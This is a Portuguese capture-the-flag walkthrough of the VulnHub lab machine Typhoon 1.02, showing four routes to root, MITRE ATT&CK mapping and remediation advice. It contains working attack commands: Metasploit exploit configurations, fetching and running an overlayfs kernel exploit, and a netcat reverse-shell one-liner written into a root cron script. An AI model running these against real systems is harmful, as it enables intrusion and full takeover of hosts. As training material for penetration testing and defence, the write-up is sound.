# Typhoon: 1.02 — Quando Cada Porta É Uma Porta Aberta

Boa rapaziada!! Typhoon 1.02 é o "canivete suíço" das máquinas boot2root do VulnHub. Sério, quatro caminhos distintos para o root: admin MongoDB sem autenticação, Tomcat Manager com credenciais padrão, Drupalgeddon2 e RCE do Lotus CMS. Escolha seu vetor, qualquer vetor. Depois combine com um script cron root com escrita global ou CVE-2015-1328 (overlayfs LPE) para conseguir uid=0. A máquina é um exemplo de livro do que acontece quando um servidor roda todos os serviços imagináveis sem endurecer nenhum deles. Superfície de ataque genuinamente absurda. Respeito ao Prakhar Prasad pelo clássico. (☞ﾟヮﾟ)☞

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Typhoon: 1.02 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/typhoon-102,267/ |
| **Técnicas** | Enumeração multi-serviço Nmap, interface admin MongoDB não autenticada, extração de credencial de NoSQL, login SSH, LPE overlayfs Ubuntu 14.04 (CVE-2015-1328), upload de arquivo Tomcat Manager (credenciais padrão), tomcat_mgr_upload via Metasploit, script cron root com escrita global, Drupalgeddon2 (CVE-2018-7600), execução PHP Lotus CMS |
| **CVEs** | CVE-2015-1328 (escalação de privilégios overlayfs Ubuntu 14.04, EDB-37292), CVE-2018-7600 (execução remota de código Drupalgeddon2), CVE-2007-5024 (upload WAR Tomcat Manager), CWE-284 (interface admin MongoDB não autenticada) |
| **Grupos APT** | APT41: combina exploração de aplicação web (Tomcat, Drupal) com LPE de kernel para escalação root confiável em intrusões corporativas; Grupo Lazarus: explora interfaces admin expostas (MongoDB, Tomcat) como técnica principal de acesso inicial; FIN7: usa credenciais padrão em interfaces de gerenciamento como acesso de primeiro estágio em ataques direcionados |

---

## Resumo do Ataque

```
nmap → 16+ serviços: FTP(21), SSH(22), SMTP(25), DNS(53), HTTP(80),
        POP3(110), rpcbind(111), SMB(139/445), IMAP(143), CUPS(631),
        IMAPS(993), POP3S(995), NFS(2049), MySQL(3306), PostgreSQL(5432),
        Tomcat(8080)

Caminho 1 (Principal):
  → robots.txt → /mongoadmin/
  → MongoDB: sem auth → DB credentials → typhoon:789456123
  → SSH typhoon:789456123
  → uname → Ubuntu 14.04 → CVE-2015-1328 (EDB-37292)
  → gcc 37292.c -o rootshell → ./rootshell → uid=0(root)

Caminho 2:
  → Tomcat :8080 → Manager (tomcat:tomcat)
  → Metasploit tomcat_mgr_upload → Meterpreter
  → /tab/script.sh (escrita global, dono root) → reverse shell → root

Caminho 3:
  → http://alvo/drupal/ → CVE-2018-7600 (Drupalgeddon2) → www-data
  → CVE-2015-1328 → root

Caminho 4:
  → http://alvo/cms/ → Lotus CMS PHP exec → shell
  → CVE-2015-1328 → root

→ cat /root/root-flag
```

---

## Metodologia

1. Varredura completa de portas para identificar a ampla superfície de ataque
2. Enumeração web: robots.txt, brute-force de diretórios, fingerprinting de serviços
3. **Caminho 1 (Principal):** Extração de credencial MongoDB → SSH → LPE de kernel
4. **Caminho 2:** Upload Tomcat Manager → Meterpreter → script cron root com escrita global
5. **Caminho 3:** RCE Drupalgeddon2 → LPE de kernel
6. **Caminho 4:** Execução PHP Lotus CMS → LPE de kernel
7. Captura da flag de root

---

## Passo 1 — Descoberta do Host e Varredura Completa de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -sV -sC -A 192.168.1.101
```

| Porta | Serviço |
|---|---|
| 21 | FTP |
| 22 | SSH |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP (Apache) |
| 110 | POP3 |
| 111 | rpcbind |
| 139/445 | NetBIOS/SMB |
| 143 | IMAP |
| 631 | IPP (CUPS) |
| 993 | IMAPS |
| 995 | POP3S |
| 2049 | NFS |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 8080 | Tomcat/Coyote JSP |

Dezesseis serviços. Cada um é um vetor de ataque potencial. A amplitude da exposição é a característica definidora desta máquina.

**Nota sobre o mundo real:** Essa superfície de ataque se parece com o que um testador de penetração encontraria em um servidor Ubuntu sem patches que foi provisionado com um conjunto de pacotes "tudo incluso" e nunca revisado. Múltiplos avisos CISA alertam especificamente que sistemas voltados para internet com mais de 5-7 serviços abertos ampliam dramaticamente a superfície de ataque e devem ser considerados criticamente mal configurados.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

```bash
curl -s http://192.168.1.101/robots.txt
# → /mongoadmin/

dirb http://192.168.1.101
# → /drupal/
# → /cms/
# → /mongoadmin/
```

Porta 8080: acesse `http://192.168.1.101:8080`. Apache Tomcat Manager está acessível. Teste credenciais padrão imediatamente:

```bash
curl -u tomcat:tomcat http://192.168.1.101:8080/manager/html
# → HTTP 200, aplicação Manager acessível com credenciais padrão
```

`tomcat:tomcat` funciona. Esse é um achado crítico.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1078.001 — Contas Válidas: Contas Padrão

---

## Caminho 1 (Principal): MongoDB → SSH → CVE-2015-1328

### Passo 3a — Extração de Credencial do MongoDB

Acesse `http://192.168.1.101/mongoadmin/`. A interface phpMoAdmin ou similar não exige autenticação. Defina o banco de dados ativo para `credentials` (listado com ~84MB):

A coleção mostra documentos de credenciais armazenados. Procure pelo usuário `typhoon`:

```
{ "username": "typhoon", "password": "789456123" }
```

**Credenciais:** `typhoon` / `789456123`

**Nota sobre o mundo real:** A configuração padrão do MongoDB até a versão 2.6 (2014) era escutar em todas as interfaces sem autenticação. Milhares de instâncias MongoDB de produção permaneceram publicamente expostas com configurações padrão por anos após isso. Grupos APT incluindo APT41 e Grupo Lazarus realizaram varredura em massa de instâncias MongoDB expostas como técnica principal de acesso inicial de 2016 a 2019.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais Não Seguras: Credenciais em Arquivos

---

### Passo 4a — Login SSH como typhoon

```bash
ssh typhoon@192.168.1.101
# Senha: 789456123

typhoon@typhoon-pc:~$ id
# uid=1000(typhoon) gid=1000(typhoon) groups=1000(typhoon)
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1078 — Contas Válidas

---

### Passo 5a — Exploit de Kernel: CVE-2015-1328 (EDB-37292)

Verifique a versão do SO:

```bash
uname -a
# Linux typhoon-pc 3.13.0-32-generic #57~precise1-Ubuntu SMP ...
lsb_release -a
# Ubuntu 14.04
```

O kernel Ubuntu 14.04 3.13.0-32 é vulnerável à escalação de privilégios local overlayfs (CVE-2015-1328). O exploit é EDB-37292:

```bash
searchsploit ubuntu 14.04 local
# → linux/local/37292.c  Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04)
```

Transfira e compile no alvo:

```bash
# Máquina atacante:
cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/
cd /tmp
python3 -m http.server 80

# Máquina alvo:
cd /tmp
wget http://IP_ATACANTE/37292.c
gcc 37292.c -o rootshell
chmod +x rootshell
./rootshell
```

```
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Nota sobre o mundo real:** CVE-2015-1328 afeta Ubuntu 14.04 LTS que chegou ao End-of-Life em abril de 2019. Kernels sem patches por muito tempo são uma realidade persistente em ambientes corporativos onde cronogramas de atualização não são aplicados. O APT41 usa especificamente exploits LPE de kernel como capacidade de segundo estágio após comprometimento inicial de aplicação web.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

### Passo 6a — Flag de Root

```bash
cat /root/root-flag
```

---

## Caminho 2: Tomcat Manager Upload → Meterpreter → Script Cron Root com Escrita Global

### Passo 3b — Upload WAR via Metasploit Tomcat

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set rhost 192.168.1.101
set rport 8080
set httpusername tomcat
set httppassword tomcat
set lhost IP_ATACANTE
exploit
```

Sessão Meterpreter abre como `tomcat7` ou `www-data`. Abra um shell:

```bash
shell
id
# uid=108(tomcat7) gid=116(tomcat7)
```

### Passo 4b — Script Cron Root com Escrita Global

Enumere arquivos graváveis:

```bash
find / -writable -type f 2>/dev/null | grep -v proc
# → /tab/script.sh

ls -la /tab/script.sh
# -rwxrwxrwx 1 root root ... /tab/script.sh
```

O arquivo é de propriedade do root e tem escrita global. Provavelmente é executado por uma tarefa cron do root. Sobrescreva-o:

```bash
# No atacante: inicie listener
nc -lvnp 1234

# No alvo: sobrescreva o script
echo "mkfifo /tmp/vvwjo; nc IP_ATACANTE 1234 0</tmp/vvwjo | /bin/sh >/tmp/vvwjo 2>&1; rm /tmp/vvwjo" > /tab/script.sh
```

Quando o cron disparar, o shell root chegará ao listener.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Caminho 3: Drupalgeddon2 (CVE-2018-7600)

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set rhost 192.168.1.101
set targeturi /drupal
set lhost IP_ATACANTE
exploit
```

Sessão Meterpreter como `www-data`. Escale para root usando o método de exploit de kernel do Caminho 1.

**Nota sobre o mundo real:** CVE-2018-7600 (Drupalgeddon2) está no catálogo de Vulnerabilidades Conhecidas Exploradas da CISA. Afeta Drupal 6.x, 7.x e 8.x. A exploração é trivial e automatizada. Múltiplos grupos APT usaram Drupalgeddon2 como vetor de acesso inicial em campanhas de 2018.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público

---

## Caminho 4: Execução PHP Lotus CMS

```bash
msfconsole
use exploit/multi/http/lcms_php_exec
set rhost 192.168.1.101
set uri /cms/
set lhost IP_ATACANTE
exploit
```

Sessão Meterpreter obtida. Escale para root usando o exploit de kernel.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1059.004 — Shell Unix

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | `typhoon:789456123` | MongoDB /mongoadmin/ sem auth | Login SSH |
| Credencial | `tomcat:tomcat` | Credenciais padrão Tomcat Manager | Upload WAR |
| CVE | CVE-2015-1328 (EDB-37292) | Kernel Ubuntu 14.04 | Escalação de privilégios local |
| CVE | CVE-2018-7600 (Drupalgeddon2) | /drupal/ | RCE como www-data |
| Script com escrita global | /tab/script.sh | Enumeração do sistema de arquivos | Shell root via cron |
| Flag root | (conteúdo do root-flag) | /root/root-flag | Conclusão do desafio |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Admin MongoDB exposto sem autenticação | Milhares de instâncias MongoDB eram expostas publicamente por config padrão; APT41 e Lazarus fizeram varredura em massa | Vincule MongoDB ao localhost; exija autenticação; remova interfaces admin web de produção |
| 2 | Credenciais armazenadas em MongoDB em texto claro | Bancos NoSQL armazenando senhas em texto claro são um achado crítico | Hash senhas com bcrypt/Argon2; nunca armazene credenciais em texto claro em nenhum banco |
| 3 | Tomcat Manager com credenciais padrão | Credenciais padrão (tomcat:tomcat) são universalmente conhecidas e escaneadas por ferramentas automatizadas | Mude credenciais do Tomcat imediatamente após implantação; remova o Manager app se não for necessário |
| 4 | Ubuntu 14.04 EOL com kernel sem patch (CVE-2015-1328) | SO em EOL com LPE sem patch é um achado consistente em avaliações corporativas | Aplique cronogramas de atualização de SO; migre de sistemas EOL; use gerenciamento automatizado de patches |
| 5 | Script cron root com escrita global (/tab/script.sh) | Scripts cron graváveis permitem que qualquer usuário sobrescreva e execute código arbitrário como root | `chmod 700` em todos os scripts cron; audite arquivos graváveis semanalmente; use AIDE/tripwire |
| 6 | Drupalgeddon2 (CVE-2018-7600) em Drupal sem patch | No CISA KEV; explorado em massa por grupos APT em 2018; exploração trivial | Atualize o core do Drupal imediatamente; aplique patches de segurança em 48 horas após o lançamento |
| 7 | Amplitude de serviços expostos (16+ portas) | Cada serviço exposto é uma superfície de ataque independente; serviços redundantes multiplicam o risco | Desative todos os serviços não necessários; firewall por padrão-negar; aplique princípio de funcionalidade mínima |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso Inicial | Acesso Inicial | Contas Válidas: Contas Padrão | T1078.001 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron | T1053.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Vincule MongoDB ao localhost**: `net.bindIp: 127.0.0.1` no mongod.conf; exija autenticação para todas as conexões
2. **Remova phpMoAdmin ou ferramentas similares de admin web** de servidores de produção
3. **Mude credenciais do Tomcat Manager**: atualize `tomcat-users.xml`; remova o Manager app se não for utilizado
4. **Corrija Ubuntu para uma versão LTS suportada**: Ubuntu 14.04 chegou ao EOL em abril de 2019; CVE-2015-1328 requer atualização do SO
5. **Corrija scripts cron com escrita global**: `chmod 700 /tab/script.sh; chown root:root /tab/script.sh`
6. **Atualize o core do Drupal**: aplique avisos de segurança SA-CORE-2018-002; habilite atualizações de segurança automáticas
7. **Remova ou restrinja o Lotus CMS**: atualize para a versão mais recente ou remova se não for utilizado
8. **Desative todos os serviços não necessários**: FTP, SMTP, DNS, NFS, MySQL, PostgreSQL devem ser desativados ou bloqueados por firewall, a menos que sejam explicitamente necessários

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventarie todos os serviços em execução; classifique cada um por necessidade |
| Proteger | Controle de Acesso | Vincule MongoDB ao localhost; mude padrões do Tomcat; desative FTP anônimo |
| Proteger | Segurança de Dados | Hash senhas em MongoDB; sem credenciais em texto claro em bancos |
| Detectar | Anomalias e Eventos | Alerte em acesso MongoDB não autenticado; monitore atividade do manager Tomcat |
| Responder | Planejamento de Resposta | Rotacione todas as credenciais comprometidas; aplique CVE-2015-1328 e CVE-2018-7600 |
| Recuperar | Planejamento de Recuperação | Reconstrua host comprometido; audite todas as configurações de serviço |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Exija autenticação para MongoDB; remova credenciais padrão do Tomcat |
| AC-6 | Menor Privilégio | Remova Manager app se não for usado; restrinja acesso NFS/FTP |
| CM-7 | Funcionalidade Mínima | Desative todos os serviços não necessários; vincule serviços ao localhost |
| SI-2 | Correção de Falhas | Corrija CVE-2015-1328 e CVE-2018-7600; atualize do Ubuntu 14.04 EOL |
| IA-2 | Identificação e Autenticação | Exija autenticação para todas as interfaces admin incluindo MongoDB |
| IA-5 | Gerenciamento de Autenticador | Mude padrões Tomcat/MongoDB; aplique credenciais fortes |

### CISA KEV

Tanto CVE-2015-1328 quanto CVE-2018-7600 são referenciados em avisos CISA. CVE-2018-7600 (Drupalgeddon2) está catalogado no catálogo de Vulnerabilidades Conhecidas Exploradas da CISA e requer correção imediata per BOD 22-01. Acesso MongoDB não autenticado mapeia para as diretrizes CISA sobre proteção de infraestrutura voltada para internet (AA21-008A).

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (auth MongoDB; rotação de credencial Tomcat; patching Drupal)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (patch CVE-2015-1328; atualização de SO de EOL)
- **D3-NI** — Isolamento de Rede (desativar serviços não necessários; firewall padrão-negar)
- **D3-FA** — Monitoramento de Acesso a Arquivo (monitorar gravações em /tab/script.sh; alertar em modificação de script cron)

---

## Considerações Finais

Typhoon 1.02 é a máquina que você mostra para um cliente quando ele pergunta "como é um servidor mal configurado na prática?" Cada vulnerabilidade nesta máquina é um achado real que aparece em avaliações de produção reais, do MongoDB sem auth às credenciais padrão do Tomcat até o LPE de kernel EOL. Os múltiplos caminhos de ataque ensinam uma lição importante: quando um servidor tem tantos serviços expostos, você não precisa de um zero-day. Você precisa de paciência e uma checklist. Cada um desses serviços entregou a máquina de forma independente.

O caminho MongoDB (Caminho 1) é o mais elegante: sem exploração, sem ferramentas, só um navegador e uma tela de coleção de credenciais. A lição não passa despercebida. Bancos de dados mal configurados são consistentemente um dos achados de maior impacto em avaliações externas. Máquina absurda, top demais para ensinar recon em amplitude. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
